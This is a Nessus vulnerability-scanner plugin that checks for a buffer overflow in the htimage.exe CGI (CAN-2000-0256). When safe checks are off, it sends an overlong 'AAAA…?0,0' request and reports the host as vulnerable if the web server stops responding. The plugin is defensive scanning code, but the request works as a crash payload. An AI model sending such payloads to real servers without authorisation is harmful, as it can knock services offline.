#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
#
# See the Nessus Scripts License for details
#
# Added some extra checks. Axel Nennker axel@nennker.de

if(description)
{
 script_id(10376);
 script_version ("$Revision: 1.22 $");
 script_bugtraq_id(1117);
 script_cve_id("CAN-2000-0256");

 name["english"] = "htimage.exe overflow";
 name["francais"] = "dépassement de buffer dans htimage.exe";

 script_name(english:name["english"],
	     francais:name["francais"]);
 
 # Description
 desc["english"] = "
There is a buffer overflow in the remote
htimage.exe cgi when it is given the request :

/cgi-bin/htimage.exe/AAAA[....]AAA?0,0

An attacker may use it to execute arbitrary code
on this host.

Solution : delete it
Risk factor : High";

 desc["francais"] = "
Il y a un dépassement de buffer dans le 
CGI distant htimage.exe quand on lui fait
la requète :

/cgi-bin/htimage.exe/AAAAA[....]AAAA?0,0

Un pirate peut utiliser ce problème
pour executer du code arbitraire sur
ce système.

Solution : supprimez ce CGI
Facteur de risque : Elevé";


 script_description(english:desc["english"],
 		    francais:desc["francais"]);

 # Summary
 summary["english"] = "Is htimage.exe vulnerable to a buffer overflow ?";
 summary["francais"] = "htimage.exe est-il vulneréble à un buffer overflow ?";
 script_summary(english:summary["english"],
 		francais:summary["francais"]);

 # Category
 script_category(ACT_MIXED_ATTACK); # mixed

 # Dependencie(s)
 script_dependencie("find_service.nes", "no404.nasl");
 
 # Family
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"],
 	       francais:family["francais"]);
 
 # Copyright
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
 		  francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 
 script_require_ports("Services/www", 80);
 exit(0);
}

# The attack starts here
include("http_func.inc");
include("http_keepalive.inc");



port = get_kb_item("Services/www");
if(!port)port = 80;
if(!get_port_state(port))exit(0);

if(safe_checks())
{
 foreach dir (cgi_dirs())
 {
 if(is_cgi_installed_ka(item:string(dir, "/htimage.exe"), port:port))
 {
  report = "
There may be a  buffer overflow in the remote
htimage.exe cgi when it is given the request :
  
/cgi-bin/htimage.exe/AAAA[....]AAA?0,0
  
An attacker may use it to execute arbitrary code
on this host.
  
*** Nessus reports this vulnerability using only
*** information that was gathered. Use caution
*** when testing without safe checks enabled.
  
Solution : delete it
Risk factor : High";

  security_hole(port:port, data:report);
  exit(0);
  }
 }
 exit(0);
}


if(http_is_dead(port:port))exit(0);

foreach dir (cgi_dirs())
{
 if(is_cgi_installed_ka(item:string(dir, "/htimage.exe"), port:port))
 {
  req = string(dir, "/htimage.exe/", crap(741), "?0,0");
  soc = http_open_socket(port);
  if(soc)
  {
  req = http_get(item:req, port:port);
  send(socket:soc, data:req);
  r = http_recv(socket:soc);
  if(!r)
   {
    security_hole(port);
   }
  }
 exit(0);
 }
}


